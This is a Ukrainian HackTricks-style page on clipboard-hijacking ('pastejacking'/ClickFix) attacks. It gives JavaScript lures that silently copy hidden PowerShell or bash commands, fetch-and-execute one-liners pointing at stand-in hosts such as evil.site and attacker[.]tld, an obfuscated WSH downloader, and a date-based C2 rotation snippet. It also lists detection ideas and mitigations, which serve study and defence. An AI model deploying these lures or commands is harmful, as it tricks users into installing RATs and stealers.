# Атаки перехоплення буфера обміну (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Ніколи не вставляйте те, що ви самі не копіювали." – давня, але все ще слушна порада

## Огляд

Перехоплення буфера обміну — також відоме як *pastejacking* — зловживає тим, що користувачі регулярно копіюють і вставляють команди, не перевіряючи їх. Зловмисна веб-сторінка (або будь-який контекст з підтримкою JavaScript, такий як Electron або Desktop application) програмно поміщає текст, контрольований атакуючим, у системний буфер обміну. Жертв підштовхують, зазвичай через ретельно продумані інструкції соціальної інженерії, натиснути **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), або відкрити термінал і *вставити* вміст буфера обміну, негайно виконуючи довільні команди.

Оскільки **файл не завантажується і вкладення не відкривається**, ця техніка обходить більшість засобів безпеки електронної пошти та веб-вмісту, які моніторять вкладення, макроси або пряме виконання команд. Тому атака популярна у фішингових кампаніях, які доставляють поширені сімейства шкідливого ПЗ, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.

## Примусові кнопки копіювання та приховані payloads (macOS one-liners)

Деякі macOS infostealers клонують сайти інсталяторів (наприклад, Homebrew) і **примушують використовувати кнопку “Copy”**, щоб користувачі не могли виділити лише видимий текст. Запис у буфері обміну містить очікувану команду інсталятора плюс доданий Base64 payload (наприклад, `...; echo <b64> | base64 -d | sh`), тож одне вставлення виконує обидві частини, поки інтерфейс приховує додатковий етап.

## Proof-of-Concept на JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. User visits a typosquatted or compromised site (e.g. `docusign.sa[.]com`)
2. Injected **ClearFake** JavaScript calls an `unsecuredCopyToClipboard()` helper that silently stores a Base64-encoded PowerShell one-liner in the clipboard.
3. HTML instructions tell the victim to: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` executes, downloading an archive that contains a legitimate executable plus a malicious DLL (classic DLL sideloading).
5. The loader decrypts additional stages, injects shellcode and installs persistence (e.g. scheduled task) – ultimately running NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (легітимний Java WebStart) шукає у своєму каталозі `msvcp140.dll`.
* Зловмисна DLL динамічно визначає адреси API за допомогою **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) за допомогою **curl.exe**, дешифрує їх, використовуючи ролінговий XOR-ключ `"https://google.com/"`, інжектує фінальний shellcode і розпаковує **client32.exe** (NetSupport RAT) у `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Запускає JScript downloader у **cscript.exe**
3. Отримує MSI payload → розміщує `libcef.dll` поруч із підписаним застосунком → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer через MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Виклик **mshta** запускає прихований PowerShell-скрипт, який отримує `PartyContinued.exe`, витягує `Boat.pst` (CAB), відновлює `AutoIt3.exe` за допомогою `extrac32` та конкатенації файлів і, врешті-решт, запускає `.a3x`-скрипт, який exfiltrates облікові дані браузера на `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Деякі кампанії ClickFix повністю пропускають завантаження файлів і наказують жертвам вставити one‑liner, який завантажує та виконує JavaScript через WSH, забезпечує persistence і щодня змінює C2. Приклад спостереженого ланцюга:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ключові риси
- Обфускований URL перевертається під час виконання, щоб протистояти поверхневій перевірці.
- JavaScript забезпечує персистентність через Startup LNK (WScript/CScript) і обирає C2 відповідно до поточного дня — це дозволяє швидку ротацію доменів.

Мінімальний фрагмент JS, що використовується для ротації C2 за датою:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
На наступній стадії зазвичай розгортають loader, який встановлює persistence і завантажує RAT (наприклад, PureHVNC), часто прив'язуючи TLS до hardcoded сертифіката і розбиваючи трафік на chunks.

Detection ideas specific to this variant
- Дерево процесів: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (або `cscript.exe`).
- Артефакти автозапуску: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, який викликає WScript/CScript з JS шляхом під `%TEMP%`/`%APPDATA%`.
- Реєстр/RunMRU та телеметрія командного рядка, які містять `.split('').reverse().join('')` або `eval(a.responseText)`.
- Повторювані `powershell -NoProfile -NonInteractive -Command -` з великими stdin payloads для постачання довгих скриптів без довгих командних рядків.
- Заплановані завдання, які пізніше виконують LOLBins, наприклад `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` під задачею/шляхом, що виглядає як updater (наприклад, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Щоденно ротовані C2 hostnames та URLs із патерном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Корелюйте події запису в clipboard, за якими йде вставка Win+R і негайний запуск `powershell.exe`.

Blue-teams можуть поєднати телеметрію clipboard, створення процесів та реєстру, щоб точніше виявляти зловживання pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію **Win + R** команд – перевіряйте незвичні Base64 / обфусковані записи.
* Security Event ID **4688** (Process Creation), де `ParentImage` == `explorer.exe` і `NewProcessName` у { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** для створень файлів у `%LocalAppData%\Microsoft\Windows\WinX\` або у тимчасових папках безпосередньо перед підозрілою подією 4688.
* EDR clipboard sensors (якщо присутні) – корелюйте `Clipboard Write`, за яким одразу слідує новий процес PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Останні кампанії масово створюють підроблені CDN/browser verification pages ("Just a moment…", IUAM-style), які примушують користувачів копіювати OS-specific команди з їхнього clipboard у нативні консолі. Це виводить виконання за межі браузерного sandbox і працює як на Windows, так і на macOS.

Key traits of the builder-generated pages
- Виявлення OS через `navigator.userAgent` для підбору payloads (Windows PowerShell/CMD vs. macOS Terminal). Опціонально додаються приманки/no-ops для непідтримуваних ОС, щоб зберегти ілюзію.
- Автоматичне копіювання в clipboard при безпечних UI-діях (checkbox/Copy), при цьому видимий текст може відрізнятися від вмісту clipboard.
- Блокування мобільних пристроїв і поповер з покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Опціональна обфускація та single-file injector для перезапису DOM скомпрометованого сайту інтерфейсом перевірки в стилі Tailwind (не потрібно реєструвати новий домен).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- Використовуйте `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` щоб виконання продовжувалося після закриття терміналу, зменшуючи видимі артефакти.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Веб: Сторінки, що прив'язують Clipboard API до віджетів верифікації; невідповідність між відображеним текстом і clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace у підозрілих контекстах.
- Кінцева точка Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` незабаром після взаємодії з браузером; batch/MSI installers, що виконуються з `%TEMP%`.
- Кінцева точка macOS: Terminal/iTerm, що породжує `bash`/`curl`/`base64 -d` з `nohup` поблизу подій браузера; фонові завдання, що виживають після закриття терміналу.
- Корелюйте `RunMRU` Win+R історію та записи в буфері обміну з наступним створенням консольних процесів.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Заходи пом'якшення

1. Browser hardening – відключити clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) або вимагати жест користувача.
2. Security awareness – навчити користувачів *type* чутливі команди або спочатку вставляти їх у текстовий редактор.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control — щоб блокувати довільні one-liners.
4. Network controls – блокувати вихідні запити до відомих доменів pastejacking та malware C2.

## Пов'язані трюки

* **Discord Invite Hijacking** часто використовує той самий підхід ClickFix після заманювання користувачів у шкідливий сервер:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
